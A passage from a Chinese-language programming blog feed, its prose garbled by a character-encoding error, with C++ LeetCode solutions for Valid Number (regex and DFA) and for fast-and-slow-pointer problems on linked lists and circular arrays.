è§£æ³•äºŒ - Regular Expressionåœ¨è§£æ³•ä¸€å¯«å‡ºåˆç† pattern çš„æ™‚å€™ï¼Œæˆ‘å°±æƒ³åˆ°äº† regular expressionã€‚
é›–ç„¶ regular expression çš„å¯«æ³•æˆ‘å·²ç¶“å¿˜äº†ï¼Œä½†å¾é€™å€‹å½±ç‰‡ Regular Expressions (Regex) Tutorial: How to Match Any Pattern of Text é‡æ–°å­¸ç¿’ï¼Œå†åƒè€ƒä¸€ä¸‹ç›¸é—œçš„ è¨è«–ä¸² ï¼Œå°±å¯ä»¥å¯«å‡ºä¸€å€‹ç¥ç°¡æ½”çš„ç¨‹å¼ç¢¼ ï¼š
class Solution &#123;public:  bool isNumber(string s) &#123;    //[spaces][+/-]æ•¸å­—(å¯ä»¥æ˜¯å°æ•¸)[e[+/-]æ•¸å­—(ä¸èƒ½æ˜¯å°æ•¸)][spaces]    //regex pattern(&quot;\\s*[+-]?(([0-9]*\.?[0-9]+)|([0-9]+\.?[0-9]*))([e][+-]?[0-9]+)?\\s*&quot;);    regex pattern(&quot;\s*[+-]?(([0-9]*\.?[0-9]+)|([0-9]+\.?[0-9]*))([e][+-]?[0-9]+)?\s*&quot;);        return regex_match(s, pattern);  &#125;&#125;;

é€™å€‹ç‰ˆæœ¬ç„¡æ³•é€šé leetcode ä¸Šçš„ test casesï¼Œä¸éæˆ‘ç”¨ Sublime Text æ¸¬è©¦æ™‚çµæœæ­£ç¢ºã€‚
é›–ä¸ç¢ºå®šæ˜¯ä»€éº¼å•é¡Œï¼Œä½†ç¾åœ¨çš„ç›®çš„ä¸æ˜¯é€¼è‡ªå·±è¦æŠŠæ‰€æœ‰æ±è¥¿éƒ½å¯«å°ï¼Œæˆ‘åªæ˜¯æƒ³æ¬£è³æ¬£è³ç°¡æ½”è§£çš„ç¾å¥½ï¼Œæ‰€ä»¥ bug å…ˆæ“±è‘—ã€‚çœ‹çœ‹é€™ç¨‹å¼ç¢¼çœŸçš„è¦ºå¾—ç¥æ¸…æ°£çˆ½ã€‚
è§£æ³•ä¸‰ - Deterministic Finite AutomatonåŸºæ–¼å¥½å¥‡çš„å¿ƒç†ï¼Œæˆ‘åˆå»ç¿»äº†ä¸€ä¸‹è¨è«–å€ï¼Œçµæœçœ‹åˆ°ä¸€å€‹è¶…çŒ›çš„æ±è¥¿ - DFA (Deterministic Finite Automaton)ã€‚é€™å‚¢ä¼™åŸºæœ¬ä¸Šå°±æ˜¯ä¸€å€‹ç‹€æ…‹æ©Ÿï¼Œæ ¹æ“šä½ çš„è¼¸å…¥æœƒåœ¨ä¸åŒç‹€æ…‹é–“è·³ä¾†è·³å»ï¼Œæ‰€ä»¥ä½ æœ€å¾Œåªè¦çœ‹æœ‰æ²’æœ‰è·³åˆ° valid state å°±å¥½ï¼Œè¶…é…·ã€‚
class Solution &#123;public:  bool isNumber(string s) &#123;    int state = 0;    vector&lt;vector&lt;int&gt; &gt; transTable = &#123;      &#123;2, 1, -1, 3, 0, -1&#125;, // Q0      &#123;2, -1, -1, 3, -1, -1&#125;, // Q1      &#123;2, -1, 5, 4, 8, -1&#125;, // Q2      &#123;4, -1, -1, -1, -1, -1&#125;, // Q3      &#123;4, -1, 5, -1, 8, -1&#125;, // Q4      &#123;7, 6, -1, -1, -1, -1&#125;, // Q5      &#123;7, -1, -1, -1, -1, -1&#125;, // Q6      &#123;7, -1, -1, -1, 8, -1&#125;, // Q7      &#123;-1, -1, -1, -1, 8, -1&#125; // Q8    &#125;;        bitset&lt;9&gt; validStates(&quot;110010100&quot;);        for(char c: s) &#123;      int type = inputType(c);      state = transTable[state][type];      if(state == -1) return false;    &#125;        return validStates[state];  &#125;private:  int inputType(char c) &#123; // use type ID as index to get next state in the transition table.    if(isdigit(c)) return 0; // T0    if(c == &#x27;+&#x27; || c == &#x27;-&#x27;) return 1; // T1    if(c == &#x27;e&#x27;) return 2; // T2    if(c == &#x27;.&#x27;) return 3; // T3    if(c == &#x27; &#x27;) return 4; // T4    else return 5; // T5  &#125;&#125;;

é€™ç¨®è§£æ³•çœŸçš„æœ‰å¤ å¸¥ï¼Œå‡è¨­ä½ ä»Šå¤©æ²’æœ‰è¦æ‰¾å·¥ä½œæˆ–å¾—æŠŠé€™æ±è¥¿å­¸æœƒçš„å£“åŠ›ï¼Œæ˜¯ä¸æ˜¯è‚¯å®šæœƒæ„Ÿå—åˆ°ä¸€è‚¡é–‹å¿ƒçš„æ„Ÿè¦ºï¼Œå› ç‚ºè¢«é–‹çœ¼ç•Œäº†ï¼è€Œä¸æ˜¯ä¸€å †è‡ªå·±å¾—å­¸æœƒï¼ŒçŸ®å”·æˆ‘æ€éº¼æƒ³ä¸å‡ºä¾†ç­‰ç­‰çš„å„ç¨®å»¶ä¼¸æƒ…ç·’ã€‚
å› ç‚ºæˆ‘ä¹‹å‰ä¹Ÿæ²’æœ‰çœŸæ­£å­¸é DFA çš„ç†è«–ï¼Œå°±ä¸å¤šèªªäº†ï¼Œæœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥åƒè€ƒä¸€ä¸‹é€™å…©å€‹è¨è«–ä¸²ï¼Œæ‡‰è©²å°±èƒ½æ¸…æ¥šï¼š

[C++] My thought with DFA
https://leetcode.com/problems/valid-number/discuss/23798/Cleanest-C%2B%2B-Solution-using-DFA-(impress-your-interviewer-with-elegant-code!!)

ç¸½çµä»Šå¤©è·Ÿå¤§å®¶åˆ†äº«äº†ä¸€æ¬¡åˆ· Hard é¡Œçš„å¿ƒè·¯æ­·ç¨‹ï¼Œä¸»è¦ä¹Ÿæ˜¯å¸Œæœ›å¤§å®¶æ›´æŠŠå¿ƒæƒ…æ”¾è¼•é¬†ï¼Œäº«å—åˆ·é¡Œéç¨‹ï¼Œç•¢ç«Ÿäººç”Ÿè‹¦çŸ­ï¼Œæ—¢ç„¶æœ‰ç·£ä¾†åˆ·é¡Œï¼Œä¸å¦‚å°±é–‹é–‹å¿ƒå¿ƒåœ°å­¸ç¿’ï¼Œè¶Šå¯«è¶Šé–‹å¿ƒæ‰æœƒè¶Šå¯«è¶Šå²å®³ï¼Œå¸Œæœ›é€™ç¯‡æ–‡ç« å°æ–¼æ­£åœ¨é¡Œæµ·ä¸­å¥®é¬¥çš„å·¥ç¨‹å¸«å€‘æœ‰äº›å¹«åŠ©ã€‚
å»¶ä¼¸é–±è®€
åˆ·é¢˜éœ€è¦hardä¸€èµ·åˆ·å—
è®“åˆ·é¡Œå¹¸ç¦æ„Ÿæé«˜çš„ä¸€ç™¾å€‹å¿ƒå¾—

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººã€é›»è…¦è¦–è¦ºå’Œäººå·¥æ™ºæ…§æœ‰å°‘è¨±ç ”ç©¶ï¼Œæ­£åœ¨å­¸ç¿’ç”¨å¿ƒé«”æœƒäº‹ç‰©çš„æœ¬è³ªè·Ÿä¸æ–·é€²å…¥å­¸ç”Ÿå¿ƒæ…‹æ”¹é€²ã€‚
]]></content>
      <tags>
        <tag>Algorithm</tag>
        <tag>Leetcode</tag>
        <tag>Software Engineer</tag>
        <tag>è»Ÿé«”å·¥ç¨‹å¸«é¢è©¦</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode åˆ·é¡Œ pattern - Fast &amp; Slow Pointer</title>
    <url>/2019/11/22/leetcode-pattern-fast-and-slow-pointer/</url>
    <content><![CDATA[å‰è¨€èº«åœ¨å¤§ CS æ™‚ä»£ï¼Œæœ‰è¶Šä¾†è¶Šå¤šäººæŠ•å…¥åˆ·é¡Œçš„è¡Œåˆ—ï¼Œåœ¨çœ¼èŠ±æ’©äº‚çš„é¡Œæµ·ä¸­ï¼Œè¦æƒ³æœ‰æ•ˆç‡åœ°åˆ·é¡Œï¼ŒæŒæ¡ä¸¦é€šé”é¡Œç›®è§£æ³•èƒŒå¾Œï¼Œå¯ä»¥ä¸æ–·è¢«æ‹¿ä¾†ä½¿ç”¨çš„è§€å¿µï¼Œæ‰èƒ½åšåˆ°ä»¥ç°¡ç¦¦ç¹ã€‚ä¹‹å‰ Huli å¯«çš„ ç¨‹å¼è§£é¡Œæ–°æ‰‹å…¥é–€æ³¨æ„äº‹é … ä¹Ÿè¬›å¾—éå¸¸å¥½ï¼Œå¯«é¡Œç›®æ˜¯ç‚ºäº†å­¸æœƒè§£é¡Œçš„æ€è€ƒæ–¹æ³•ï¼Œç¢ºä¿è‡ªå·±æŒæ¡é‡è¦çš„è³‡æ–™çµæ§‹è·Ÿæ¼”ç®—æ³•ã€‚é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼æˆ‘æƒ³è¦å¯«é€™ç³»åˆ—çš„æ–‡ç« ï¼ŒæŠŠå¤šå€‹æ•£è½åœ¨å„è™•çš„é¡Œç›®éŠœæ¥èµ·ä¾†ï¼Œä»¥å¾Œçœ‹åˆ°ç›¸ä¼¼çš„å•é¡Œå°±å¯ä»¥èˆ‰ä¸€åä¸‰ï¼Œè€Œä¸æ˜¯å»èƒŒå„é¡Œç›®çš„è§£æ³•ã€‚
èˆ‰ä¾‹ä¾†èªªï¼Œä¹‹å‰é‡éä¸€é¡Œé›»è©±é¢è©¦ï¼Œå•åˆ°çš„é¡Œç›®æ˜¯ï¼š
Input: vector&lt;bool&gt; holidays, int ptoholidays è¡¨ç¤ºå¹³æ—¥æˆ–å‡æ—¥ï¼Œä¾‹å¦‚ 0000011 è¡¨ç¤ºå‰é¢ 5 å¤©æ˜¯å¹³æ—¥ï¼Œå¾Œé¢ 2 å¤©æ˜¯å‡æ—¥ã€‚pto è¡¨ç¤ºæœ€å¤šå¯ä»¥æ”¾å¹¾å¤©å‡ã€‚Output: è¨ˆç®—åœ¨å¯ä»¥ç”¨å®Œ pto çš„æƒ…æ³ä¸‹ï¼Œæœ€ä¹…å¯ä»¥æ”¾å¤šé•·çš„å‡ã€‚ç¯„ä¾‹ï¼šholidays = &#123;0,0,0,0,0,1,1&#125;, pto = 2, output = 4      å› ç‚ºå¯ä»¥æ”¾ &#123;0,0,0,1,1,1,1&#125;

åŸºæœ¬ä¸Šå› ç‚ºä¹‹å‰æœ‰å¯«é Sliding Window çš„ patternï¼Œæ‰€ä»¥é€™é¡Œå¾ˆå¿«å°±å¯«å‡ºä¾†äº†ï¼Œä¹Ÿé †åˆ©é€²åˆ°ä¸‹ä¸€é—œï¼Œæ‰€ä»¥å¤§å®¶ä¸éœ€è¦è¿½æ±‚æŠŠé¡Œç›®éƒ½åˆ·å®Œï¼Œè€Œæ˜¯æŒæ¡å¥½é‡è¦çš„åŸºç¤ï¼Œæ¥ä¸‹ä¾†å°±æ˜¯æ‡‰ç”¨é€™äº›åŸºç¤å°±å¯ä»¥é¢å°å¾ˆå¤šè®ŠåŒ–é¡Œï¼ˆç•¶ç„¶é‚„æ˜¯æœƒæœ‰ä¸€äº›è§£æ³•å¾ˆå·§å¦™çš„é¡Œç›®ï¼Œä½†å…¶å¯¦å¤§éƒ¨åˆ†å…¬å¸ä¸æœƒç¡¬å‡ºå·§å¦™é¡Œï¼‰ã€‚ä¸Šé¢é€™é¡Œé‚„æœ‰ä¸€å€‹ follow-up å•é¡Œï¼Œå¯ä»¥çœ‹æˆ‘çš„ é¢ç¶“åˆ†äº«ã€‚
é‚£ç¹¼ä¹‹å‰å¯«éçš„ Two Pointerã€Sliding Window è·Ÿ Next Greater Elementï¼Œä»Šå¤©è¦ä¾†è·Ÿå¤§å®¶ä»‹ç´¹å¦ä¸€ç¨®æ¼”ç®—æ³•çš„ pattern - Fast &amp; Slow Pointerã€‚
Fast &amp; Slow Pointer çš„ç¬¬ä¸€å€‹ç¯„ä¾‹ - Leetcode #876 - Middle of the Linked Listé¡Œç›®
æš´åŠ›è§£æ³•é€™é¡Œéå¸¸ç°¡å–®ï¼Œæˆ‘å€‘åªè¦å…ˆèµ°éä¸€æ¬¡ linked listï¼Œè¨ˆç®—æ•´å€‹ list çš„é•·åº¦ - lenï¼Œç„¶å¾Œæ¥ä¸‹ä¾†å†é‡æ–°èµ°ä¸€æ¬¡ len&#x2F;2 çš„ list å°±å¥½ã€‚
/** * Definition for singly-linked list. * struct ListNode &#123; *     int val; *     ListNode *next; *     ListNode(int x) : val(x), next(NULL) &#123;&#125; * &#125;; */class Solution &#123;public:    ListNode* middleNode(ListNode* head) &#123;        /// Calculate the length of list        ListNode *ptr = head;        int len = 0;                while(ptr != nullptr) &#123;            ++len;            ptr = ptr-&gt;next;        &#125;                // Move ptr to the middle of list        ptr = head;        for(int i = 0; i &lt; len/2; ++i) &#123;            ptr = ptr-&gt;next;        &#125;                return ptr;    &#125;&#125;;

Fast &amp; Slow Pointer è§£æ³•é›–ç„¶ä¸Šé¢çš„è§£æ³• OKï¼Œä½†å¦‚æœè¢«å•åˆ°åªèƒ½èµ°ä¸€æ¬¡ list å°±è¦è§£æ±ºï¼Œæˆ‘å€‘å°±éœ€è¦ä½¿ç”¨ Fast &amp; Slow Pointer äº†ã€‚åŸºæœ¬ä¸Šå‘¢ï¼Œåšæ³•å°±æ˜¯æŒ‡å®šå…©å€‹ pointer - fast è·Ÿ slowï¼Œä¸€é–‹å§‹ slow è·Ÿ fast éƒ½æŒ‡å‘ headï¼Œæ¥ä¸‹ä¾†ï¼Œåœ¨ fast èµ°åˆ° linked list çš„åº•ç«¯å‰ï¼Œfast ä¸€æ¬¡èµ°å…©æ­¥ï¼Œslow ä¸€æ¬¡èµ°ä¸€æ­¥ï¼Œç•¶ fast èµ°åˆ°åº•çš„æ™‚å€™ï¼Œslow å°±æœƒåœ¨ä¸­é–“ã€‚
ä¸éæˆ‘å€‘é‚„éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œlinked list é•·åº¦æœ‰ even è·Ÿ odd å…©ç¨®ï¼Œä»¥ä¸‹åˆ†åˆ¥è§£æï¼š

Odd:1-&gt;2-&gt;3-&gt;NULL
ç•¶ slow èµ°åˆ° 2ï¼Œfast å·²ç¶“èµ°åˆ° 3ï¼Œä¸‹ä¸€æ¬¡ä¸æœƒå†é€² while è¿´åœˆï¼Œé€™æ™‚ return slow å°±å¥½ã€‚
Even:1-&gt;2-&gt;3-&gt;4-&gt;NULL
ç•¶ slow èµ°åˆ° 2ï¼Œfast èµ°åˆ° 3ï¼Œä¸‹ä¸€æ¬¡å› ç‚º fast-&gt;next-&gt;next å°±æ˜¯ NULL äº†ï¼Œfast ä¸èƒ½å†èµ°å…©æ­¥ï¼Œæ‰€ä»¥ä¸æœƒå†é€² while è¿´åœˆï¼Œé€™æ™‚è¦ return slow-&gt;nextã€‚

å¯¦ä½œå‡ºä¾†çš„ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š
/** * Definition for singly-linked list. * struct ListNode &#123; *     int val; *     ListNode *next; *     ListNode(int x) : val(x), next(NULL) &#123;&#125; * &#125;; */class Solution &#123;public:    ListNode* middleNode(ListNode* head) &#123;        ListNode *slow = head, *fast = head;                while(fast-&gt;next != nullptr &amp;&amp; fast-&gt;next-&gt;next != nullptr) &#123;            slow = slow-&gt;next;            fast = fast-&gt;next-&gt;next;        &#125;                return (fast-&gt;next == nullptr) ? slow : slow-&gt;next;    &#125;&#125;;

Fast &amp; Slow Pointer çš„ç¬¬äºŒå€‹ç¯„ä¾‹ - Leetcode #141 - Linked List Cycleé¡Œç›®å‰›å‰›é‚£é¡Œç®—æ˜¯éå¸¸ç°¡å–®ï¼Œåªæ˜¯æƒ³è®“å¤§å®¶äº†è§£ä¸€ä¸‹ Fast &amp; Slow Pointer çš„åŸºæœ¬æ¦‚å¿µï¼Œæˆ‘å€‘æ¥è‘—çœ‹é›£ä¸€é»é»çš„é¡Œç›®ï¼š

æš´åŠ›æ³•è¦è§£é€™å€‹é¡Œç›®ï¼Œæœ€ç›´è¦ºçš„æƒ³æ³•å°±æ˜¯è¨˜éŒ„æ¯ä¸€å€‹èµ°éçš„ nodeã€‚è€Œè¦çŸ¥é“æœ‰æ²’æœ‰ cycleï¼Œåªè¦ç¹¼çºŒèµ°ä¸‹å»ï¼Œå¦‚æœæœ‰çœ‹åˆ°è¨˜éŒ„éçš„ nodeï¼Œå°±çŸ¥é“æœ‰ cycleï¼›ä½†å¦‚æœèµ°åˆ°åº•äº†éƒ½é‚„æ²’é‡åˆ°æœ‰è¨˜éŒ„éçš„ nodeï¼Œé‚£å°±çŸ¥é“æ²’æœ‰ cycleã€‚
ä»¥å¯¦ä½œä¸Šï¼Œæˆ‘å€‘å¯ä»¥ç”¨ä¸€å€‹ set è¨˜éŒ„å·²ç¶“èµ°éçš„ nodeï¼Œç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š
/*** Definition for singly-linked list.* struct ListNode &#123;* int val;* ListNode *next;* ListNode(int x) : val(x), next(NULL) &#123;&#125;* &#125;;*/class Solution &#123;public:    bool hasCycle(ListNode *head) &#123;        unordered_set&lt;ListNode*&gt; nodeSeen;        while(head != nullptr) &#123;            if(nodeSeen.count(head)) &#123;                 return true;             &#125;            else &#123;                 nodeSeen.insert(head);             &#125;            head = head-&gt;next;        &#125;                return false;    &#125;&#125;;

é€™å€‹è§£æ³•é›–ç„¶æ­£ç¢ºï¼Œä½†å› ç‚ºéœ€è¦è¨˜éŒ„ï¼Œæ‰€ä»¥è¦é¡å¤–èŠ± O(n) çš„ç©ºé–“ä¾†å„²å­˜ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥ä½¿ç”¨ä»Šå¤©è¦å­¸çš„ pattern ä¾†åšåˆ° O(1) çš„ç©ºé–“è¤‡é›œåº¦ã€‚
Fast &amp; Slow Pointer è§£æ³•é€™é¡Œè¦æ€éº¼æ‡‰ç”¨ Fast &amp; Slow Pointer å°±æ¯”è¼ƒä¸ç›´è¦ºï¼Œæ¥è‘—è®“æˆ‘å€‘ä¸€æ­¥æ­¥ä¾†åˆ†æã€‚
é¦–å…ˆï¼Œæˆ‘å€‘ä¸€æ¨£å…ˆå‡è¨­æœ‰å…©å€‹ pointer - fast è·Ÿ slowï¼Œfast è·Ÿ slow ä¸€é–‹å§‹éƒ½æŒ‡å‘ headï¼Œä¹‹å¾Œï¼Œfast æ¯æ¬¡èµ°å…©æ­¥ï¼Œslow æ¯æ¬¡èµ°ä¸€æ­¥ã€‚æŒ‰ç…§é€™å€‹é‚è¼¯ï¼Œæˆ‘å€‘å¯ä»¥åˆ†æˆå…©ç¨®æƒ…æ³ï¼š

æ²’æœ‰ cycleï¼šå¦‚æœæ²’æœ‰ cycleï¼Œfast èµ°åˆ°åº•çš„æ™‚å€™ï¼Œslow æ‰èµ°åˆ°ä¸€åŠï¼Œæ‰€ä»¥å¦‚æœ fast èµ°åˆ°åº•ï¼Œå°±çŸ¥é“æ²’æœ‰ cycle
æœ‰ cycleï¼šå¦‚æœæœ‰ cycleï¼Œfast æœƒå…ˆé€²å» cycleï¼Œç„¶å¾Œå°±ä¸€ç›´åœ¨ cycle è£¡é¢è·‘ï¼Œè€Œé›–ç„¶æ…¢äº†ä¸€äº›ï¼Œä½† slow ä¹Ÿæœƒé€²åˆ° cycleï¼Œè·Ÿ fast ä¸€èµ·åœ¨ cycle è£¡é¢è·‘ï¼ˆè…¦æµ·ä¸­æ€éº¼çªç„¶å‡ºç¾å¤©ç«ºé¼ è·‘æ­¥çš„ç•«é¢ï¼‰ã€‚

ä¸Šé¢çš„åˆ†æè®“æˆ‘å€‘çŸ¥é“æ€éº¼åˆ¤æ–·æ²’æœ‰ cycleï¼Œå¯æ˜¯å¦‚æœæœ‰ cycleï¼Œé‚£ slow è·Ÿ fast ä¸å°±æœƒç„¡çª®åœ°è·‘ä¸‹å»ï¼Ÿ
ç­”æ¡ˆæ˜¯ä¸æœƒï¼Œå› ç‚ºåªè¦æœ‰ cycleï¼Œslow è·Ÿ fast ä¸€å®šæœƒç›¸é‡ï¼ŒåŸå› æ˜¯ï¼Œç•¶ fast è·Ÿ slow éƒ½åœ¨ cycle è£¡é¢è·‘ï¼Œfast é²æ—©æœƒè¿½åˆ°é›¢ slow ä¸€æ­¥æˆ–å…©æ­¥ã€‚

å·®ä¸€æ­¥æ™‚ï¼šfast ç§»å…©æ­¥ï¼Œslow ç§»ä¸€æ­¥ï¼Œå…©è€…ç›¸é‡ã€‚
å·®å…©æ­¥æ™‚ï¼šfast ç§»å…©æ­¥ï¼Œslow ç§»ä¸€æ­¥ï¼Œå…©è€…åªå·®ä¸€æ­¥ï¼Œä¸‹ä¸€æ¬¡å°±æœƒç›¸é‡ã€‚

æ‰€ä»¥ï¼Œåªè¦æœ‰ cycleï¼Œslow è·Ÿ fast ä¸€å®šæœƒç›¸é‡ï¼
ç¶“éä¸Šé¢çš„åˆ†æï¼Œå¯¦ä½œå°±è®Šå¾—ç›¸ç•¶ç°¡å–®ï¼š
/*** Definition for singly-linked list.* struct ListNode &#123;* int val;* ListNode *next;* ListNode(int x) : val(x), next(NULL) &#123;&#125;* &#125;;*/class Solution &#123;public:    bool hasCycle(ListNode *head) &#123;        ListNode *slow = head, *fast = head;                while(fast != nullptr &amp;&amp; fast-&gt;next != nullptr) &#123;            fast = fast-&gt;next-&gt;next;            slow = slow-&gt;next;                        if(slow == fast) &#123;                return true;            &#125;        &#125;                return false;    &#125;&#125;;

å¾ˆæ˜é¡¯ï¼Œé€™å€‹æ¼”ç®—æ³•ä¸éœ€è¦èŠ±é¡å¤–çš„ O(n) ç©ºé–“ï¼Œåœ¨ memory ä½¿ç”¨åƒç·Šæ™‚å°±æ˜¯ä¸€å€‹å¥½è§£æ³•ã€‚
Fast &amp; Slow Pointer çš„ç¬¬ä¸‰å€‹ç¯„ä¾‹ - Leetcode #143 - Reorder Listé¡Œç›®
æš´åŠ›è§£æ³•æš´åŠ›è§£æ³•æ»¿ç›´è§€çš„ï¼Œå°±å…ˆæŠŠæ‰€æœ‰ node å­˜åˆ°ä¸€å€‹ array ä¸­ï¼Œå‰©ä¸‹å°±åªæ˜¯ç”¨å…©å€‹ pointer åˆ†åˆ¥å¾é ­è·Ÿå°¾é–‹å§‹ï¼Œæ›´æ–°é€™äº› node çš„ next å°±å¥½ã€‚å¯¦ä½œå¦‚ä¸‹ï¼š
class Solution &#123;public:    void reorderList(ListNode* head) &#123;        // Corner case        if(!head || !head-&gt;next) return;                // Store all nodes into a vector        vector&lt;ListNode*&gt; vl;        while (head) &#123;            vl.push_back(head);            head = head-&gt;next;        &#125;        // Reassign the next pointer        int i = 0, j = vl.size() - 1;        while ( i + 1 &lt; j ) &#123;            vl[i]-&gt;next = vl[j];            vl[j]-&gt;next = vl[i+1];            ++i, --j;        &#125;        vl[j]-&gt;next = nullptr;    &#125;&#125;;

Fast &amp; Slow Pointer è§£æ³•åŒæ¨£çš„å•é¡Œä¾†äº†ï¼Œæˆ‘å€‘èƒ½ä¸èƒ½ä¸èŠ±é¡å¤–çš„ç©ºé–“ä¾†è§£æ±ºé€™é¡Œå‘¢ï¼Ÿ
ç­”æ¡ˆæ˜¯å¯ä»¥ï¼åªè¦ä½ æœƒ Fast &amp; Slow Pointerï¼å› ç‚ºå¦‚æœæˆ‘å€‘å…ˆä»”ç´°è§€å¯Ÿé¡Œç›®ï¼Œå°±æœƒç™¼ç¾é€™é¡Œæ˜¯è¦æŠŠå¾ŒåŠæ®µçš„ list å…ˆåè½‰ï¼Œç„¶å¾Œå†è·Ÿå‰åŠæ®µçš„ list äº¤éŒ¯ã€‚æ‰€ä»¥æˆ‘å€‘å¯ä»¥å…ˆç”¨ Fast &amp; Slow Pointer æ‰¾åˆ° list ä¸­é»ï¼ŒæŠŠå¾ŒåŠ list reverseï¼Œç„¶å¾Œå°±ä¾åºé€£æ¥å‰åŠè·Ÿå¾ŒåŠçš„ nodeã€‚æ–¼æ˜¯ç©ºé–“è¤‡é›œåº¦å°±é™åˆ° O(1)ã€‚
/*** Definition for singly-linked list.* struct ListNode &#123;* int val;* ListNode *next;* ListNode(int x) : val(x), next(NULL) &#123;&#125;* &#125;;*/class Solution &#123;public:    void reorderList(ListNode* head) &#123;        if(!head or !head-&gt;next) return;                // Find the middle of list        ListNode *slow = head, *fast = head;                while(fast != NULL &amp;&amp; fast-&gt;next != NULL) &#123;            slow = slow-&gt;next;            fast = fast-&gt;next-&gt;next;        &#125;                // Reverse the second half of the list        ListNode *second = reverse(slow);        ListNode *first = head;                // Construct the new list by interleaving two lists        while(first != nullptr &amp;&amp; second != nullptr) &#123;            ListNode* tmp = first-&gt;next;            first-&gt;next = second;            first = tmp;            tmp = second-&gt;next;            second-&gt;next = first;            second = tmp;        &#125;                if(first != NULL)            first-&gt;next = NULL;    &#125;    private:    ListNode* reverse(ListNode* head) &#123;        ListNode* prev = nullptr;        while(head != nullptr) &#123;            ListNode* next = head-&gt;next;            head-&gt;next = prev;            prev = head;            head = next;        &#125;                return prev;    &#125;&#125;;

Fast &amp; Slow Pointer çš„ç¬¬å››å€‹ç¯„ä¾‹ - Leetcode #457 - Circular Array Loopé¡Œç›®
Fast &amp; Slow Pointer è§£æ³•é€™é¡Œé›–ç„¶ä¸æ˜¯ linked list çš„é¡Œç›®ï¼Œä½†å…¶å¯¦æœ‰ cycle çš„æ¦‚å¿µï¼Œå°±å¯ä»¥é‹ç”¨ Fast &amp; Slow Pointerã€‚ç›´è§€çš„åšæ³•å°±æ˜¯ä¾åºæŠŠæ¯å€‹ element ç•¶ä½œèµ·é»ï¼Œåªè¦æœ‰ä¸€å€‹èµ·é»æ»¿è¶³ circular çš„æ¢ä»¶ï¼Œå°±å¯ä»¥ return trueï¼Œåä¹‹å¦‚æœæ²’æœ‰ä¸€å€‹èµ·é»å¯ä»¥æ§‹æˆ circularï¼Œé‚£å°± return falseã€‚
å› ç‚ºå¦å¤–è¦æ³¨æ„ cycle å¿…é ˆæœ‰è¶…éä¸€å€‹ elementï¼Œé‚„æœ‰å¿…é ˆä¸€ç›´åŒå‘å…©å€‹æ¢ä»¶ï¼Œæ‰€ä»¥ä¸èƒ½åªæ˜¯å»æ‰¾æœ‰æ²’æœ‰ cycleï¼ŒåŒæ™‚é‚„å¾—æª¢æŸ¥é€™å…©ä»¶äº‹ã€‚ä¸éåŸºæœ¬çš„æ¡†æ¶å…¶å¯¦å°±æ˜¯ Fast &amp; Slow Pointerï¼Œå¤§å®¶å¯ä»¥çœ‹çœ‹ä¸‹é¢çš„å¯¦ä½œé«”æœƒä¸€ä¸‹ï¼š
class Solution &#123;public:    bool circularArrayLoop(vector&lt;int&gt;&amp; nums) &#123;        for (int i = 0; i &lt; nums.size(); i++) &#123;            bool isForward = nums[i] &gt;= 0;  // if we are moving forward or not            int slow = i, fast = i;            // If slow or fast becomes &#x27;-1&#x27; this means we can&#x27;t find cycle for this number            do &#123;                slow = findNextIndex(nums, isForward, slow);  // move one step for slow pointer                fast = findNextIndex(nums, isForward, fast);  // move one step for fast pointer                if (fast != -1) &#123;                    fast = findNextIndex(nums, isForward, fast);  // move another step for fast pointer                &#125;            &#125; while (slow != -1 &amp;&amp; fast != -1 &amp;&amp; slow != fast);            if (slow != -1 &amp;&amp; slow == fast) &#123;                return true;            &#125;        &#125;        return false;    &#125;    private:    int findNextIndex(const vector&lt;int&gt; &amp;nums, bool isForward, int currentIndex) &#123;        bool direction = nums[currentIndex] &gt;= 0;        if (isForward != direction) &#123;          return -1;  // change in direction, return -1        &#125;        // wrap around for negative numbers        int nextIndex = (currentIndex + nums[currentIndex] + nums.size()) % nums.size();        // one element cycle, return -1        if (nextIndex == currentIndex) &#123;          nextIndex = -1;        &#125;        return nextIndex;    &#125;&#125;;

ç¸½çµä»Šå¤©è·Ÿå¤§å®¶ä»‹ç´¹äº†ä¸€å€‹æ–°çš„ pattern - Fast &amp; Slow Pointerï¼Œä¸Šé¢æä¾›çš„å››é¡Œæ˜¯è®“å¤§å®¶åˆæ­¥é«”é©—ä¸€ä¸‹ï¼Œé›–ç„¶é€™å€‹ pattern çš„è®ŠåŒ–ä¸æ˜¯å¾ˆå¤§ï¼Œä½†åœ¨ä¸€äº›éœ€è¦ç‰¹åˆ¥å„ªåŒ–çš„åœ°æ–¹é‚„æ˜¯æ´¾å¾—ä¸Šç”¨å ´ã€‚
å¦‚æœä½ å°é€™å€‹ pattern æœ‰èˆˆè¶£ï¼Œå¯ä»¥å†å»çœ‹çœ‹å»¶ä¼¸é–±è®€çš„ç­†è¨˜ã€‚è£¡é¢æœ‰æ›´å¤šåŒæ¨£ pattern çš„é¡Œç›®ï¼Œå¦‚æœæŠŠé€™äº›é¡Œç›®ä¸€æ¬¡å¯«å®Œï¼Œä¹‹å¾Œçœ‹åˆ°é¡ä¼¼çš„é¡Œç›®æ‡‰è©²å°±æ¯”è¼ƒå®¹æ˜“æƒ³åˆ°é€™ç¨®è§£æ³•ï¼
å»¶ä¼¸é–±è®€
æˆ‘çš„ Leetcode åˆ·é¡Œç­†è¨˜ - Fast &amp; Slow Pointer pattern

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººã€é›»è…¦è¦–è¦ºå’Œäººå·¥æ™ºæ…§æœ‰å°‘è¨±ç ”ç©¶ï¼Œæ­£åœ¨å­¸ç¿’ ç”¨å¿ƒé«”æœƒäº‹ç‰©çš„æœ¬è³ªè·Ÿ ä¸æ–·é€²å…¥å­¸ç”Ÿå¿ƒæ…‹æ”¹é€²ã€‚
]]></content>
      <tags>
        <tag>Algorithm</tag>
        <tag>Leetcode</tag>
        <tag>Software Engineer</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode åˆ·é¡Œ pattern - Next Greater Element</title>
    <url>/2019/10/26/leetcode-pattern-next-greater-element/</url>
